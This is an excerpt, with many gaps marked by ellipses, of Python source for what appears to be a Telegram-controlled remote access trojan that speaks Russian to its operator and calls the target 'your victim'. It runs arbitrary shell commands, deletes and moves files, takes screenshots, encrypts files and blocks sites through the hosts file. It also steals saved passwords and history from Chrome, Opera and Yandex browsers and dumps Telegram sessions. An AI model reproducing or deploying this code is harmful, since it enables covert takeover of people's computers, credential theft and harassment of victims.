# Editing by K3rnel-Dev, thanks Right for open source-code
# Enjoy
...
==================================    
                    ...
                    \n/blockURL ссылка на сайт без https:// - Заблокирует доступ к сайту
                    \n/unblockURLS - Разблокирует все заблокированные сайты
                    \nСэр, если вы скинете мне голосовые то я открою его у вашей жертвы
                    \nСэр еще вы можешь скинуть мне любой файл и я его сохраню на пк жертвы""")
            except Exception as e:
                bot.reply_to()
        ...
        def screen(message, res=False):
            bot.reply_to(message, '[Jarvis] Команда принята ожидайте')
        ...
        def antiviruses(message, res=False):
            bot.reply_to(message, '[Jarvis] Команда принята Сэр ожидайте!')
            Antiviruses = {
        ...
        def screen(message, res=False):
            try:
                ...
                bot.send_message(message.chat.id, 'Сэр у вашей жертвы нету веб камеры.')
        ...
        def screen(message, res=False):
            try:
                ...
                try:
                    ...
                    bot.send_message(message.chat.id,
                                     '[Jarvis]Сэр скриншот сделать удалось, но не получилось удалить скриншот после отправки\nКод ошибки:\n' + str(
                                         e))
                bot.send_message(message.chat.id, '[Jarvis]Успешно Сэр  ссылка открыта!\nВот скриншот')
            except Exception as e:
                bot.send_message(message.chat.id,
                                 '[Jarvis]Не удалось открыть ссылку Сэр, используй такой формат: /open_link https://ссылка\nКод ошибки:\n' + str(
                                     e))
        ...
        def screen(message, res=False):
            try:
                ...
                os.chdir(text1)
                bot.send_message(message.chat.id, '[Jarvis]Успешно Сэр теперь мы в директории: ' + str(os.getcwd()))
            except Exception as e:
        ...
        def screen(message, res=False):
            try:
                ...
                bot.reply_to(message, '[Jarvis] Команда принята Сэр ожидайте!')
                os.makedirs(text1)
                bot.send_message(message.chat.id, '[Jarvis]Папка создана Сэр')
            except Exception as e:
                bot.send_message(message.chat.id, e)
        ...
        def screen(message, res=False):
            try:
                ...
                bot.reply_to(message, '[Jarvis] Команда принята Сэр ожидайте!')
                shutil.rmtree(text1)
                bot.send_message(message.chat.id, '[Jarvis]Успешно удаленно Сэр')
            except Exception as e:
                bot.send_message(message.chat.id, e)
        ...
        def screen(message, res=False):
            try:
                ...
                bot.send_message(message.chat.id, '[Jarvis]Успешно переименованно Сэр!')
            except Exception as e:
                bot.send_message(message.chat.id, e)
        ...
        def screen(message, res=False):
            try:
                bot.reply_to(message, '[Jarvis] Команда принята Сэр ожидайте!')
                os.rename(message.text.split()[1], message.text.split()[2])
                bot.send_message(message.chat.id, '[Jarvis]Успешно перемещено Сэр!')
            except Exception as e:
                bot.send_message(message.chat.id, e)
        ...
        def handle_docs_photo(message):
            try:
                ...
                bot.reply_to(message,
                             "[Jarvis]Файл сохранён в текущую директорию Сэр, её содержание можете посмотреть командой /listdir")
            except Exception as e:
                bot.reply_to(message, e)
        ...
        def video(message, res=True):
            try:
                ...
                a = os.system(text1)
                if a == 1:
                    bot.reply_to(message, '[Jarvis]Команда не выполнилась Сэр')
                elif a == 0:
                    bot.reply_to(message, '[Jarvis]Команда выполнилась Сэр')
            except Exception as e:
                bot.reply_to(message, e)
        ...
        def video(message, res=True):
            try:
                bot.reply_to(message, '[Jarvis] Команда принята Сэр ожидайте!')
                p.hotkey('volumemute')
                bot.reply_to(message, '[Jarvis]Звук успешно был выключен Сэр')
            except Exception as e:
                bot.reply_to(message, e)
        ...
        def video(message, res=True):
            try:
                ...
                for x in range(1, 100):
                    p.hotkey('volumeup')
                bot.reply_to(message, '[Jarvis]Звук успешно был включен на 100% Сэр!')
            except Exception as e:
                bot.reply_to(message, e)
        ...
        def video(message, res=True):
            try:
                bot.reply_to(message, '[Jarvis] Понял вас Сэр выключаю компьютер')
        ...
        def video(message, res=True):
            try:
                bot.reply_to(message, '[Jarvis] Команда принята Сэр ожидайте!')
                p.hotkey('alt', 'f4')
                bot.reply_to(message, '[Jarvis]Успешно Сэр!')
            except Exception as e:
                bot.reply_to(message, e)
        ...
        def video(message, res=True):
            try:
                ...
                time = int(text1)
                bot.reply_to(message,
                             '[Jarvis] Команда принята Сэр ожидайте!')
        ...
        def video(message, res=True):
            try:
                bot.reply_to(message, '[Jarvis] Понял вас Сэр перезагружаю компьютер')
        ...
        def changeWall(message, res=True):
            try:
                ...
                changeBG(PATH)
                bot.reply_to(message, '[Jarvis] Обои успешно сменены Сэр!')
        ...
        def changeWall(message, res=True):
            try:
                ...
                bot.reply_to(message, '[Jarvis]Успешно зашифрованно Сэр!')
        ...
        def changeWall(message, res=True):
            try:
                ...
                try:
                    def get_master_key():
                        with open(os.environ[
                                      'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                ...
                try:
                    ...
                    chromepass = open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromepasswords.txt',
                                      'rb')
                except Exception as e:
                    bot.reply_to(message, e)
                try:
        ...
        def changeWall(message, res=True):
            try:
                bot.reply_to(message,
                             'Команда принята, если я молчу значит команда выполняется. Когда я закончу, отвечу.')
                try:
                ...
                if __name__ == '__main__':
                    try:
                        ...
                        shutil.copy2(login_db,
                                     'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                ...
                try:
                    ...
                    bot.reply_to(message, e)
                try:
                    history_direct_opera = open(
                        r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOPERA.txt', 'rb')
                    operapass = open(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operapasswords.txt',
                                     'rb')
                except Exception as e:
                    bot.reply_to(message, e)
            ...
            try:
                ...
                if __name__ == '__main__':
                    ...
                    try:
                        ...
                        shutil.copy2('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db',
                                     'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX1.db')
                        conn = sqlite3.connect(
                            'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX1.db')
                        cursor = conn.cursor()
                ...
                try:
                    history_direct_yandex = open(
                        r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.txt', 'rb')
                    yandexpass = open(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexpasswords.txt',
                                      'rb')
                    try:
        ...
        def changeWall(message, res=True):
            try:
                bot.reply_to(message, '[Jarvis] Дамплю телеграмм логи Сэр! ожидайте')
                try:
        ...
        def screamer(message, res=True):
            try:
                ...
                bot.reply_to(message, '[Jarvis] Включили скример вашей жертве Сэр!')
            except Exception as e:
                bot.reply_to('[Jarvis] Сэр похоже вы должны обновить ссылку на видео-файл ибо я не могу его найти!')
                bot.reply_to(message, e)
            ...
            try:
                ...
                with open(hosts, 'r+') as file:
                    ...
                    for site in blocked_sites:
                        if site in src:
                            bot.send_message(message.chat.id, '[Jarvis]Этот сайт уже заблокирован Сэр!')
                        else:
                            file.write(f'{redirect_url} {site}\n')
                            bot.send_message(message.chat.id, '[Jarvis]]Этот сайт успешно заблокирован Сэр!')
            except Exception as e:
                bot.reply_to(message, e)
                ...
                with open(hosts, 'r+') as file:
                    ...
                    for line in src:
                        if not any(site in line for site in blocked_sites):
                            file.write(line)
                    file.truncate()
                bot.reply_to(message, '[Jarvis]Все сайты успешно разблокированы Сэр!')
        ...
        def hello(message, res=False):
            try:
                bot.reply_to(message,
                             '[Jarvis] Я не понимаю вас Сэр!, пожалуйста введите /help')
            except Exception as e:
                bot.reply_to(message, e)
